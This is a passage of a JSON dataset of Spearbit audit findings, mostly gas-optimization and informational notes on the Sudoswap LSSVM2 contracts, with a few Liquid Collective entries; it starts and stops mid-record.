        "body": "In some parts of the code, custom errors are declared and later used (CurveErrorCodes and Own- able Errors), while in other parts, classic revert strings are used in require statements. Instead of using error strings, custom errors can be used, which would reduce deployment and runtime costs. Using only custom errors would improve consistency and gas cost. This would also avoid long revert strings which consume extra gas. Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas. This happens at LSSVMPair.sol#L133, LSSVMPair.sol#L666 and LSSVMPairFactory.sol#L505.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Array length read in each iteration of the loop wastes gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If not cached, the Solidity compiler will always read the length of the array from storage during each iteration. For storage array, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory array, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization LSSVMPairERC1155.sol, LSSVMPairETH.sol, LSSVMPairERC721.sol,"
        ]
    },
    {
        "title": "Not tightly packing struct variables consumes extra storage slots and gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Gas efficiency can be achieved by tightly packing structs. Struct variables are stored in 32 bytes each and so you can group smaller types to occupy less storage.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variables that are redeclared in each loop iteration can be declared once outside the loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "price is redefined in each iteration of the loop and right after declaration is set to a new value. for (uint256 i; i < numNFTs; i++) { uint256 price; (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, pair.factory().protocolFeeMultiplier()); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caller of swapTokenForSpecificNFTs() must be able to receive ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _refundTokenToSender() sends ETH back to the caller. If this caller is a contract then it might not be able to receive ETH. If it can't receive ETH then the transaction will revert. function _refundTokenToSender(uint256 inputAmount) internal override { // Give excess ETH back to caller if (msg.value > inputAmount) { payable(msg.sender).safeTransferETH(msg.value - inputAmount); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "order.doPropertyCheck could be replaced by the pair's propertyChecker()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The field+check for a separate order.doPropertyCheck in struct SellOrder is unnecessary be- cause this can already be checked via the pair's propertyChecker() without relying on the user to explicitly specify it in their order.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "_payProtocolFeeFromPair() could be replaced with _sendTokenOutput()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Both ERC20 and ETH versions of _payProtocolFeeFromPair() and _sendTokenOutput() are iden- tical in their parameters and logic.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "False positive in test_getSellInfoWithoutFee() when delta == FixedPointMathLib.WAD due to wrong implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In test_getSellInfoWithoutFee, delta is not validated via validateDelta, which causes a false positive in the current test when delta == FixedPointMathLib.WAD. This can be tried with the following proof of concept // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import {FixedPointMathLib} from ,! \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/FixedPointMathLib.sol\"; contract test{ using FixedPointMathLib for uint256; constructor() { uint256 delta = FixedPointMathLib.WAD; uint256 invDelta = FixedPointMathLib.WAD.divWadDown(delta); uint outputValue = delta.divWadDown(FixedPointMathLib.WAD - invDelta); // revert } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Checks-Effects-Interactions pattern not used in swapNFTsForToken()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "It is a defensive programming pattern to first take NFTs and then send the tokens (i.e. the Checks- Effects-Interactions pattern). function swapNFTsForToken(...) ... { ... _sendTokenOutput(tokenRecipient, outputAmount); ... _sendTokenOutput(royaltyRecipients[i], royaltyAmounts[i]); ... _payProtocolFeeFromPair(_factory, protocolFee); ... _takeNFTsFromSender(...); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two versions of withdrawERC721() and withdrawERC1155()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "withdrawERC721() and withdrawERC1155() with slightly different implementations. This is more difficult to maintain.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing sanity/threshold checks may cause undesirable behavior and/or waste of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Numerical user inputs and external call returns that are subject to thresholds due to the contract's logic should be checked for sanity to avoid undesirable behavior or reverts in later logic and wasting unnecessary gas in the process.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deviation from standard/uniform naming convention affects readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Following standard/uniform naming conventions are essential to make a codebase easy to read and understand.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational LSSVMPairFactory.sol#L471, LSSVMRouter.sol#L128-L135,"
        ]
    },
    {
        "title": "Function _getRoyaltyAndSpec() contains code duplication which affects maintainability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _getRoyaltyAndSpec() is rather long and contains code duplication. This makes it difficult to maintain. 45 function _getRoyaltyAndSpec(address tokenAddress, uint256 tokenId, uint256 value) ... if (spec <= NOT_CONFIGURED && spec > NONE) { try IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId) returns (...) { // Support Art Blocks override require(recipients_.length == bps.length); return (recipients_, _computeAmounts(value, bps), ARTBLOCKS, royaltyAddress, addToCache); } catch {} ... } else { // Spec exists, just execute the appropriate one ... ... if (spec == ARTBLOCKS) { // Art Blocks spec uint256[] memory bps; (recipients, bps) = IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId); require(recipients.length == bps.length); return (recipients, _computeAmounts(value, bps), spec, royaltyAddress, addToCache); } else ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "getSellInfo always adds 1 rather than rounding which leads to last item being sold at 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Based on the comment // We calculate how many items we can sell into the linear curve until the spot price reaches 0, rounding up. In cases where delta == spotPrice && numItems > 1, the last item would be sold at 0: delta = 100; spotPrice = 100; numItems = 2; uint256 totalPriceDecrease = delta * numItems = 200; Therefore succeeds at: if (spotPrice < totalPriceDecrease) Later calculated: uint256 numItemsTillZeroPrice = spotPrice / delta + 1; That would result in 2, while the division was an exact 1, therefore is not rounded up in case where spotPrice == delta but increased always by 1.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Natspec for robustSwapETHForSpecificNFTs() is slightly misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function robustSwapETHForSpecificNFTs() has this comment: * @dev We assume msg.value >= sum of values in maxCostPerPair This doesn't have to be the case. The transaction just reverts if msg.value isn't sufficient.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two copies of pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From() are present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Both contracts LSSVMRouter and VeryFastRouter contain the functions pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From(). This is more difficult to maintain as both copies have to stay in synch.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Not using error strings in require statements obfuscates monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "require statements should include meaningful error messages to help with monitoring the system.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "prices and balances in the curves may not be updated after calls to depositNFTs() and depositERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions depositNFTs() and depositERC20() allow anyone to add NFTs and/or ERC20 to a pair but do not update the prices and balances in the curves. And if they were to do so, then the functions might be abused to update token prices with irrelevant tokens and NFTs. However, it is not clear if/how the prices and balances in the curves are updated to reflect this. The owner can't fully rely on emits.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions enableSettingsForPair() and disableSettingsForPair() can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions enableSettingsForPair() and disableSettingsForPair() define a temporary vari- able pair. This could also be used earlier in the code to simplify the code. function enableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); LSSVMPair pair = LSSVMPair(pairAddress); ... } function disableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ... LSSVMPair pair = LSSVMPair(pairAddress); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Design asymmetry decreases code readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _calculateBuyInfoAndUpdatePoolParams() performs a check on maxExpectedToken- Input inside its function. On the other hand, the comparable check for _calculateSellInfoAndUpdatePoolParams() is done outside of the function: function _swapNFTsForToken(...) ... { // LSSVMPairERC721.sol ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(...) require(outputAmount >= minExpectedTokenOutput, \"Out too few tokens\"); ... } The asymmetry in the design of these functions affects code readability and may confuse the reader.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Providing the same _nftID multiple times will increase numPairNFTsWithdrawn multiple times to potentially cause confusion",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If one accidentally (or intentionally) supplies the same id == _nftID multiple times in the array ids[], then numPairNFTsWithdrawn is increased multiple times. Assuming this value is used via indexing for the user interface, this could be misleading.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Dual interface NFTs may cause unexpected behavior if not considered in future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Some NFTs support both the ERC721 and the ERC1155 standard. For example NFTs of the Sandbox project. Additionally, the internal layout of the parameters of cloneETHPair and cloneERC1155ETHPair are very similar: | cloneETHPair | cloneERC1155ETHPair | | --- | --- | | mstore(add(ptr, 0x3e), shl(0x60, factory)) | mstore(add(ptr, 0x3e), shl(0x60, factory)) | | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | | mstore(add(ptr, 0x66), shl(0x60, nft)) | mstore(add(ptr, 0x66), shl(0x60, nft)) | | mstore8(add(ptr, 0x7a), poolType) | mstore8(add(ptr, 0x7a), poolType) | | mstore(add(ptr, 0x7b), shl(0x60, propertyChecker)) | mstore(add(ptr, 0x7b), nftId) | In case there is a specific function that only works on ERC721, and that can be applied to ERC1155 pairs, in combination with an NFT that supports both standards, then an unexpected situation could occur. Currently, this is not the case, but that might occur in future iterations of the code.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing event emission in multicall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Not emitting events on success/failure of calls within a multicall makes debugging failed multicalls difficult. There are several actions that should always emit events for transparency such as ownership change, transfer of ether/tokens etc. In the case of a multicall function, it is recommended to emit an event for succeeding (or failing) calls.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Returning only one type of fee from getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuote- WithRoyalties() could be misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() re- turn a protocolFee variable. There are also other fees like tradeFee and royaltyTotal that are not returned from these functions. Given that these functions might be called from the outside, it is not clear why other fees are not included here.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two ways to query the assetRecipient could be confusing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPair has two ways to query the assetRecipient. On via the getter assetRecip- ient() and one via getAssetRecipient(). Both give different results and generally getAssetRecipient() should be used. Having two ways could be confusing. address payable public assetRecipient; function getAssetRecipient() public view returns (address payable _assetRecipient) { ... // logic to determine _assetRecipient }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions expecting NFT deposits can validate parameters for sanity and optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions expecting NFT deposits in their typical flows can validate parameters for sanity and opti- mization.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions expecting ETH deposits can check msg.value for sanity and optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions that expect ETH deposits in their typical flows can check for non-zero values of msg.value for sanity and optimization.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "LSSVMPairs can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "At the different LSSVMPairs, PairVariant and IMMUTABLE_PARAMS_LENGTH can be passed to LSSVM- Pair, which could store them as immutable. Then functions pairVariant() and _immutableParamsLength() can also be moved to LSSVMPair, which would simplify the code.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused values in catch can be avoided for better readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Employing a catch clause with higher verbosity may reduce readability. Solidity supports different kinds of catch blocks depending on the type of error. However, if the error data is of no interest, one can use a simple catch statement without error data.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Stale constant and comments reduce readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After some updates, the logic was added ~2 years ago when enum was changed to int16. Based on the comments and given that was upgradeable, it was expected that one could add new unconfigured specs with negative IDs between NONE (by decrementing it) and NOT_CONFIGURED. In this non-upgradeable fork, the current constants treat only the spec ID of 0 as NOT_CONFIGURED. // Anything > NONE and <= NOT_CONFIGURED is considered not configured int16 private constant NONE = -1; int16 private constant NOT_CONFIGURED = 0;",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different MAX_FEE value and comments in different places is misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The same MAX_FEE constant is declared in different files with different values, while comments indi- cate that these values should be the same. // 50%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 0.5e18; uint256 internal constant MAX_PROTOCOL_FEE = 0.1e18; // 10%, must <= 1 - MAX_FEE`",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Events without indexed event parameters make it harder/inefficient for off-chain tools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Indexed event fields make them quickly accessible to off-chain tools that parse events. However, note that each indexed field costs extra gas during emission; so it's not necessarily best to index the maximum allowed per event (three fields).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational PropertyCheckerFactory.sol#L11, LSSVMPair.sol#L83,"
        ]
    },
    {
        "title": "Some functions included in LSSVMPair are not found in ILSSVMPair.sol and ILSSVMPairFactory- Like.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "LSSVMPair contract defines the following functions which are missing from interface ILSSVMPair: 53 ROYALTY_ENGINE() spotPrice() delta() assetRecipient() pairVariant() factory() swapNFTsForToken() (2 versions) swapTokenForSpecificNFTs() getSellNFTQuoteWithRoyalties() call() withdrawERC1155()",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Absent/Incomplete Natspec affects readability and maintenance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Comments are key to understanding the codebase logic. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. However, some functions within the codebase contain issues with respect to their comments with either no Natspec or incomplete Natspec annotations, leading to partial descriptions of the functions.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational IOwnershipTransferReceiver.sol#L6, OwnableWithTransferCallback.sol#L39-L42, RangeProp-"
        ]
    },
    {
        "title": "MAX_SETTABLE_FEE value does not follow a standard notation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol establishes several constant hard-coded MAX_FEE-like variables across different con- tracts. The percentages expressed in those variables should be declared in a standard way all over the codebase. In StandardSettings.sol#L22, the standard followed by the rest of the codebase is not respected. Not respecting the standard notation may confuse the reader.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "No modifier for __Ownable_init",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Usually __Ownable_init also has a modifier like initializer or onlyInitializing, see Own- ableUpgradeable.sol#L29. The version in OwnableWithTransferCallback.sol doesn't have this. It is not really necessary as the function is internal but it is more robust if it has. function __Ownable_init(address initialOwner) internal { _owner = initialOwner; }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Wrong value of seconds in year slightly affects precision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Calculation of ONE_YEAR_SECS takes into account leap years (typically 365.25 days), looking for most exact precision. However as can be seen at NASA and stackoverflow, the value is slightly different. Current case: 365.2425 days = 31_556_952 / (24 * 3600) NASA case: 365.2422 days = 31_556_926 / (24 * 3600)",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing idempotent checks may be added for consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Setter functions could check if the value being set is the same as the variable's existing value to avoid doing a state variable write in such scenarios and they could also revert to flag potentially mismatched offchain-onchain states. While this is done in many places, there are a few setters missing this check.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing events affect transparency and monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Missing events in critical functions, especially privileged ones, reduce transparency and ease of monitoring. Users may be surprised at changes affected by such functions without being able to observe related events.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational LSSVMPair.sol#L640-L645, LSSVMPairFactory.sol#L485-L492, LSSVMPairFactory.sol#L501-L508,"
        ]
    },
    {
        "title": "Wrong error returned affects debugging and off-chain monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Error.INVALID_NUMITEMS is declared for 0 case, but is returned twice in the same function: first time for numItems == 0 and second time for numItems >= nftBalance. This can make hard to know why it is failing.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions can be renamed for clarity and consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Since both functions cloneETHPair() and cloneERC20Pair() use IERC721 nft as a parameter, renaming them to cloneERC721ETHPair() and cloneERC721ERC20Pair() respectively makes it clearer that the functions process ERC721 tokens. This also provides consistency in the naming of functions considering that we already have function cloneERC1155ETHPair() using this nomenclature.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two events TokenDeposit() with different parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The event TokenDeposit() of LSSVMPairFactory has an address parameter while the event Tok- enDeposit() of LSSVMPair has an uint256 parameter. This might be confusing. contract LSSVMPairFactory { ... event TokenDeposit(address poolAddress); ... } abstract contract LSSVMPair ... { ... event TokenDeposit(uint256 amount); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused imports affect readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The following imports are unused in  XykCurve.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {LSSVMPair} from \"../LSSVMPair.sol\"; import {LSSVMPairERC20} from \"../LSSVMPairERC20.sol\"; import {LSSVMPairCloner} from \"../lib/LSSVMPairCloner.sol\"; import {ILSSVMPairFactoryLike} from \"../LSSVMPairFactory.sol\";  LSSVMPairERC20.sol 58 import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\"; import {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";  LSSVMPairETH.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\";",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of isPair() is not intuitive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "There are two usecases for isPair() 1) To check if the contract is a pair of any of the 4 types. Here the type is always retrieved via pairVariant(). 2) To check if a pair is ETH / ERC20 / ERC721 / ERC1155. Each of these values are represented by two different pair types. Using isPair() this way is not intuitive and some errors have been made in the code where only one value is tested. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\". Function isPair() could be refactored to make the code easier to read and maintain. function isPair(address potentialPair, PairVariant variant) public view override returns (bool) { ... } These are the occurrences of use case 1: LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ,! LSSVMPairFactory.sol: address\"); ,! LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair if (isPair(recipient, LSSVMPair(recipient).pairVariant())) { // router interaction, which first queries `pairVariant()` LSSVMPairERC20.sol: LSSVMPairERC20.sol: LSSVMPairERC20.sol: erc721/LSSVMPairERC721.sol: erc721/LSSVMPairERC721.sol: erc1155/LSSVMPairERC1155.sol: // router and VeryFastRouter function pairTransferERC20From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { router.pairTransferERC20From(..., pairVariant()); router.pairTransferERC20From(..., pairVariant() router.pairTransferERC20From(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferERC1155From(..., pairVariant()); ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferNFTFrom(..., ILSSVMPairFactoryLike.PairVariant variant ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... ... } function pairTransferERC1155From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } These are the occurrences of use case 2: 59 LSSVMPairFactory.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: (isPair(...ERC721_ERC20) ...isPair(....ERC721_ETH) ...isPair(...ERC721_ERC20) ...isPair(...ERC721_ETH) ...isPair(...ERC721_ERC20) || isPair(...ERC1155_ERC20)) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20)",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Royalty related code spread across different contracts affects readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairFactory contains the function authAllowedForToken(), which has a lot of interactions with external contracts related to royalties. The code is rather similar to code that is present in the RoyaltyEngine contract. Combining this code in RoyaltyEngine contract would make the code cleaner and easier to read.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unsolicited exits can happen at the end of _setStoppedValidatorCounts(...)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
        "body": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unso- licited exits can happen at the end of _setStoppedValidatorCounts(...) to avoid extra operations like taking minimum per iteration of the loops. Note that: an = an(cid:0)1 (cid:0) min(an(cid:0)1, bn) ) an = a0 (cid:0) min(a0, n X i=1 bn) = max(0, a0 (cid:0) n X i=1 bn)",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "use _setCurrentValidatorExitsDemand",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
        "body": "If an update is needed for CurrentValidatorExitsDemand in _setStoppedValidatorCounts(...), the internal function _setCurrentValidatorExitsDemand is not used.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "Changes to the emission of RequestedValidatorExits event during catch-up",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
